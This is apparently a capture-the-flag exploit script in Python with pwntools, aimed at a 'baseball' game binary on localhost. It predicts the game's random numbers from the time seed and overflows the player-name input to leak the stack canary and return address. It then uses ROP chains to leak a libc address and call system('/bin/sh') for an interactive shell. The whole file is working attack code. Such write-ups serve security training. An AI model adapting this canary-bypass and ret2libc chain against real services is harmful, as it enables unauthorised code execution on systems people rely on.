from pwn import *
from ctypes import *
from time import *

#context.log_level = "debug"

#libc = CDLL('./libc.so.6')
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

#p = process("./baseball")
p = remote("localhost", 7882)

strikeZone = []
for i in range(5):
    for j in range(8 + 7 * i, 13 + 7 * i):
        strikeZone.append(j)
count = []

def changeToXY(loc):
    return 10 * (loc % 7) + loc // 7

def getRandom():
    return changeToXY(libc.rand() % 49)

def printStat():
    global p
    p.recvuntil("Current Stat")
    tmp = p.recvline()
    log.info(f"Current Stat{tmp.decode('utf-8')}")

def strikeThrow(rand_loc):
    random_x = rand_loc // 10
    random_y = rand_loc % 10
        
    if (random_x < 1) or (random_y < 1):
        # Need to consider mntly's cheat!
        return 0, "Ball"
    if (random_x * random_y == 0) or (random_x == 6) or (random_y == 6):
        return 24, "Strike"
    result_x = random_x + 3 if (random_x + 3 <= 6) else random_x - 3
    result_y = random_y + 3 if (random_y + 3 <= 6) else random_y - 3
    return result_x + result_y * 7, "Strike"

def defense(pStat):
    global p

    # Player Defense
    # Just Strike Out : 3 loc difference
    out_cnt = 0
    strike_cnt = 0
    ball_cnt = 0
    while out_cnt < 3:
        rand_loc = getRandom()
        strike_loc, result = strikeThrow(rand_loc)
        p.sendlineafter(b" >> ", str(strike_loc))
        if pStat: printStat()
        
        if result == "Strike":
            strike_cnt += 1
        elif result == "Ball":
            ball_cnt += 1
        
        if strike_cnt >= 3:
            out_cnt += 1
            strike_cnt = 0
            ball_cnt = 0
        elif ball_cnt >= 4:
            strike_cnt = 0
            ball_cnt = 0
        

def intentialOut(pStat):
    global p

    out_cnt = 0
    strike_cnt = 0
    while out_cnt < 3:
        rand_loc = getRandom()
        random_x = rand_loc // 10
        random_y = rand_loc % 10

        if (random_x * random_y == 0) or (random_x == 6) or (random_y == 6):
            p.sendlineafter(b" >> ", "24")
            if pStat: printStat()
        else:
            p.sendlineafter(b" >> ", "0")
            if pStat: printStat()
        
        strike_cnt += 1
        if strike_cnt >= 3:
            strike_cnt = 0
            out_cnt += 1

def HomeRun(pStat):
    rand_loc = getRandom()
    random_x = rand_loc // 10
    random_y = rand_loc % 10

    # CANARY Leak : HomeRun
    # Until I can homerun, just hit the ball
    
    while rand_loc != 33:
        # Just Hit the ball
        p.sendlineafter(b" >> ", str(random_x + random_y * 7))
        if pStat: printStat()
        rand_loc = getRandom()
        random_x = rand_loc // 10
        random_y = rand_loc % 10
    
    # HomeRun! => Leak CANARY and go to next inning
    p.sendlineafter(b" >> ", "24")

def leak_CANARY(pStat):
    # Player Attack
    HomeRun(pStat)
    payload = b"AAAAAAAAQ"
    p.sendafter(b"Please enter his/her name!\n>> ", payload)
    log.info("HOMERUN!!!")

    # Now, Need to 3 out for print HomeRun Player with CANARY (Must no homerun)
    intentialOut(pStat)
    p.recvuntil(b"Current HomeRun Player!!\n")
    CANARY = p.recvline()[len(payload):len(payload)+7]
    CANARY = u64(b"\x00" + CANARY)
    log.info(f"CANARY : {hex(CANARY)}")
    return CANARY

def leak_RETURN(pStat):
    # Player Attack
    # Fill left 7 byte of CANARY
    HomeRun(pStat)
    payload = b"A" * 0x7
    p.sendafter(b"Please enter his/her name!\n>> ", payload)
    log.info("HOMERUN!!!")

    # Fill 8 byte of SFP
    HomeRun(pStat)
    payload = b"A" * 0x8
    p.sendafter(b"Please enter his/her name!\n>> ", payload)
    log.info("HOMERUN!!!")

    # Now, Need to 3 out for print HomeRun Player with Return Address (Must no homerun)
    intentialOut(pStat)
    p.recvuntil(b"Current HomeRun Player!!\n")
    returnAddr = p.recvline()[0x18:-1]
    returnAddr = u64(returnAddr.ljust(8, b"\x00"))
    log.info(f"Return Address : {hex(returnAddr)}")
    return returnAddr

p.sendlineafter(b">> ", "1")

log.info("sendAfter")
libc.srand(libc.time(0))

isPlayerTurn = libc.rand() % 2
log.info(isPlayerTurn)

# First inning : CANARY Leak
if isPlayerTurn:
    CANARY = leak_CANARY(False)
    defense(False)
else:
    defense(False)
    CANARY = leak_CANARY(False)

# Second innning : Return Address Leak
if isPlayerTurn:
    returnAddr = leak_RETURN(False)
    defense(False)
else:
    defense(False)
    returnAddr = leak_RETURN(False)

# End current game to insert the ROP payload (inning 3 ~ 9)
for i in range(3, 10):
    if isPlayerTurn:
        intentialOut(False)
        defense(False)
    else:
        defense(False)
        intentialOut(False)

# Start new game
log.info("Before end")
p.sendlineafter(b"[y:1/n:0]\n>> ", "1")
log.info("Before end1")

p.sendlineafter(b">> ", "1")
# libc.srand(libc.time(0))

isPlayerTurn = libc.rand() % 2

# Calculate addresses
# 0. code base
binary = ELF("./baseball")
mainAddr = returnAddr - (0x17AD - 0x178a)
base = mainAddr - binary.symbols['main']
log.info(f"base: {hex(base)}")

puts = binary.symbols['puts'] + base
log.info(f"puts: {hex(puts)}")

## 2. Get ROP Gadget address
pop_rdi_rsi_rdx = 0x1291 + base
log.info(f"pop rdi; pop rsi; pop rdx; ret: {hex(pop_rdi_rsi_rdx)}")

pop_rdi = 0x12a0 + base
log.info(f"pop rdi; ret: {hex(pop_rdi)}")

ret = 0x101a + base
log.info(f"ret: {hex(ret)}")

# Make ROP Payload (include CANARY)
payloadlst = []

payloadlst.append(b"A" * 8)                         # homerun
payloadlst.append(p64(CANARY))                      # CANARY
payloadlst.append(b"A" * 8)                         # SFP

payloadlst.append(p64(pop_rdi))
payloadlst.append(p64(binary.got['puts'] + base))   # rdi

payloadlst.append(p64(puts))                        # puts
# payloadlst.append(p64(ret))                        # ret for align the Stack Alignment

payloadlst.append(p64(base + binary.symbols['runBaseball']))                       # recall main to write "/bin/sh" and system

# First inning - Insert ROP payload
if isPlayerTurn:
    for i in payloadlst:
        HomeRun(False)
        p.sendafter(b"Please enter his/her name!\n>> ", i)
        log.info(f"HOMERUN!!! - {i}")
    intentialOut(False)
    defense(False)
else:
    defense(False)
    for i in payloadlst:
        HomeRun(False)
        p.sendafter(b"Please enter his/her name!\n>> ", i)
        log.info(f"HOMERUN!!! - {i}")
    intentialOut(False)

# Other inning : intentially out
for i in range(2, 10):
    if isPlayerTurn:
        intentialOut(False)
        defense(False)
    else:
        defense(False)
        intentialOut(False)

# Now, stop the game
p.sendlineafter(b"[y:1/n:0]\n>> ", "0")

# Get leaked libc
libcELF = ELF("./libc.so.6")
puts_got = u64(p.recvline()[:-1].ljust(8, b"\x00"))
log.info(f"puts_got: {hex(puts_got)}")

libc_base = puts_got - libcELF.symbols['puts']
log.info(f"libc_base: {hex(libc_base)}")

system = libc_base + libcELF.symbols['system']
log.info(f"system: {hex(system)}")

binsh = libc_base + next(libcELF.search(b"/bin/sh"))
log.info(f"/bin/sh: {hex(binsh)}")

# Recall main
p.sendlineafter(b">> ", "1")

isPlayerTurn = libc.rand() % 2

# Make ROP payload to get shell
payloadlst = []

payloadlst.append(b"A" * 8)                         # homerun
payloadlst.append(p64(CANARY))                      # CANARY
payloadlst.append(b"A" * 8)                         # SFP

payloadlst.append(p64(pop_rdi))
payloadlst.append(p64(binsh))                       # "/bin/sh"
payloadlst.append(p64(ret))
payloadlst.append(p64(system))                      # system

# First inning - Insert ROP payload
if isPlayerTurn:
    for i in payloadlst:
        HomeRun(False)
        p.sendafter(b"Please enter his/her name!\n>> ", i)
        log.info(f"HOMERUN!!! - {i}")
    intentialOut(False)
    defense(False)
else:
    defense(False)
    for i in payloadlst:
        HomeRun(False)
        p.sendafter(b"Please enter his/her name!\n>> ", i)
        log.info(f"HOMERUN!!! - {i}")
    intentialOut(False)

# Other inning : intentially out
for i in range(2, 10):
    defense(False)
    defense(False)

# Now, stop the game
p.sendlineafter(b"[y:1/n:0]\n>> ", "0")

p.interactive()
